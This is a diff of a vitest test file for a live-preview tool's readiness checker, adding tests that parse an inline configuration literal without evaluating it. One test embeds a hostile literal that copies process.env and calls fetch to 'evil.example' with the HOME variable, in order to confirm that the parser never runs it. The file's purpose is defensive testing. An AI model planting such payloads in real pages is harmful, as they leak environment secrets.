@@ -1,13 +1,7 @@
 import { describe, expect, it } from 'vitest';
-import { analyzeV2Readiness } from '@doctor/analyze';
+import { analyzeV2Readiness, readInlineConfig } from '@doctor/readiness';
 import { generateInlineScript } from '@inline/generator';
 import type { DoctorProbe, DoctorResponse } from '@doctor/types';
-
-/**
- * `pll doctor --v2` (roadmap 1.9.0): read the served inline configuration and
- * report each runtime readiness row still at its 1.x value. Driven with the
- * real generator so the slot positions this reads stay honest.
- */
 
 function probe(inline: string): DoctorProbe {
   const response = (body: string): DoctorResponse => ({ status: 200, headers: {}, body });
@@ -19,14 +13,57 @@ function probe(inline: string): DoctorProbe {
   };
 }
 
+describe('readInlineConfig', () => {
+  it('reads what the generator writes, holes and all', () => {
+    const inline = generateInlineScript({
+      allowedOrigins: ['https://cms.example.com'],
+      skipUnchanged: true,
+      sanitizerPolicy: 'strict',
+    });
+    const config = readInlineConfig(inline);
+    expect(config?.[0]).toEqual(['https://cms.example.com']);
+    expect(config?.[11]).toBeNull();
+    expect(config?.[14]).toBe(true);
+    expect(config?.[16]).toBe('strict');
+  });
+
+  it.each([
+    ['[]', []],
+    ['[,1]', [null, 1]],
+    ['[1,,2]', [1, null, 2]],
+    ['[1,]', [1, null]],
+    ['[["a"],,,true,,]', [['a'], null, null, true, null, null]],
+    ['["a,,b","]",",["]', ['a,,b', ']', ',[']],
+    ['["\\"quoted\\",,"]', ['"quoted",,']],
+    ['["\\u003Cscript>"]', ['<script>']],
+  ])('turns %s into JSON %j', (literal, expected) => {
+    expect(readInlineConfig(`var __LIVE_PREVIEW_CONFIG__=${literal};rest`)).toEqual(expected);
+  });
+
+  it('never evaluates the page: a hostile literal is unreadable, not run', () => {
+    const hostile =
+      'var __LIVE_PREVIEW_CONFIG__=[(globalThis.__pwned = process.env), fetch("https://evil.example/?" + process.env.HOME)];';
+    expect(readInlineConfig(hostile)).toBeUndefined();
+    expect((globalThis as { __pwned?: unknown }).__pwned).toBeUndefined();
+    expect(analyzeV2Readiness(probe(hostile))).toEqual([
+      expect.objectContaining({ code: 'LP0709', level: 'info' }),
+    ]);
+  });
+
+  it('gives up on an unbalanced or non-array literal', () => {
+    expect(readInlineConfig('var __LIVE_PREVIEW_CONFIG__=[1,[2];')).toBeUndefined();
+    expect(readInlineConfig('var __LIVE_PREVIEW_CONFIG__={"a":1};')).toBeUndefined();
+    expect(readInlineConfig('<h1>no runtime</h1>')).toBeUndefined();
+  });
+});
+
 describe('analyzeV2Readiness', () => {
   it('flags every runtime row for a default (v1) configuration', () => {
     const findings = analyzeV2Readiness(
       probe(generateInlineScript({ allowedOrigins: ['https://cms.example.com'] })),
     );
-    const titles = findings.map((f) => f.title);
     expect(findings.every((f) => f.code === 'LP0709')).toBe(true);
-    expect(titles).toEqual(
+    expect(findings.map((f) => f.title)).toEqual(
       expect.arrayContaining([
         'Referrer trust is still on',
         'Messages are accepted from any window',
@@ -52,10 +89,8 @@ describe('analyzeV2Readiness', () => {
       allowedOrigins: ['https://cms.example.com'],
       disableReferrerDetection: true,
       eventSourcePolicy: 'parent-or-opener',
-      // sanitizer and skipUnchanged left at v1
     });
-    const titles = analyzeV2Readiness(probe(inline)).map((f) => f.title);
-    expect(titles).toEqual([
+    expect(analyzeV2Readiness(probe(inline)).map((f) => f.title)).toEqual([
       'Sanitizer is in compat mode',
       'Unchanged bindings are re-applied every message',
     ]);
